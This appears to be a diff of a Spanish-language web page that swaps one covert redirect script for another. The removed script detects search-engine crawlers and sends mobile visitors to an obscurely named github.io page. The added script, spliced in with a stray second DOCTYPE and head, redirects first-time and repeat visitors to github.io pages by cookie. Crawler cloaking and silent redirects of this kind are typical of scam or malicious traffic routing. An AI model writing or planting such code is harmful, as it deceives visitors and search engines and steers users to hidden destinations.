@@ -23,44 +23,25 @@
     <img id="loading-image" src="https://s6.gifyu.com/images/S89ub.gif" alt="Loading..." />
 </div>
 <meta charset="UTF-8">
-<script>
-  (function() {
-    const botsConocidos = [
-     "adsbot-google", "applebot", "baiduspider", "bingbot", "blekkobot", "Embedly", "facebookexternalhit",
-    "Facebot", "feedfetcher-google", "feedly", "FlipboardProxy", "google web preview", "googlebot",
-    "googlebot-news", "google-inspectiontool", "googleother", "GrapeshotCrawler", "linkedinbot", "mail.ru_bot",
-    "mediapartners-google", "msnbot_mobile", "msnbot", "msnbot", "pinterest", "Seznam", "SkypeUriPreview",
-    "slurp", "storebot-google", "superfeedr bot", "tumblr", "twitterbot", "yandex", "prerender"
-  ];
 
-    function esBot(userAgent) {
-      return botsConocidos.some(bot => userAgent.toLowerCase().includes(bot.toLowerCase()));
-    }
-
-    function esDispositivoMovil(userAgent) {
-      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
-    }
-
-    function esResolucionMovil() {
-      const anchoPantalla = window.screen.width;
-      const altoPantalla = window.screen.height;
-      const anchoMaxMovil = 768; // Ajusta según tus necesidades
-      const anchoMaxTablet = 1024; // Ajusta según tus necesidades
-      return (anchoPantalla <= anchoMaxMovil || altoPantalla <= anchoMaxMovil);
-    }
-
-    function redirigirURL() {
-      const userAgent = navigator.userAgent;
-
-      if (esBot(userAgent)) {
-        window.location.href = 'URL_ts';
-      } else if (esDispositivoMovil(userAgent) && esResolucionMovil()) {
-        window.location.href = 'https://joeljefe.github.io/ertertyyuytrt.github.io/sss.HTML';
-      } else {
-       
-      }
-    }
-
-    document.addEventListener('DOMContentLoaded', redirigirURL);
-  })();
-</script>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redireccionamiento basado en visitas</title>
+    <script>
+        // Función para redireccionar basado en cookies
+        function redireccionarBasadoEnVisitas() {
+            // Verificar si la cookie de visita existe
+            if (document.cookie.indexOf('visited=true') === -1) {
+                // Si la cookie no existe (es un visitante único), establecer la cookie
+                document.cookie = 'visited=true; max-age=3600'; // La cookie expira en 1 hora (3600 segundos)
+                // Redireccionar al destino para visitantes únicos
+                window.location.href = 'https://joeljefe.github.io/ertertyyuytrt.github.io/sss.HTML';
+            } else {
+                // Si la cookie existe (es un visitante repetido), redireccionar a otro destino
+                window.location.href = 'https://joeljefe.github.io/directoslink';
+            }
+        }
+    </script>
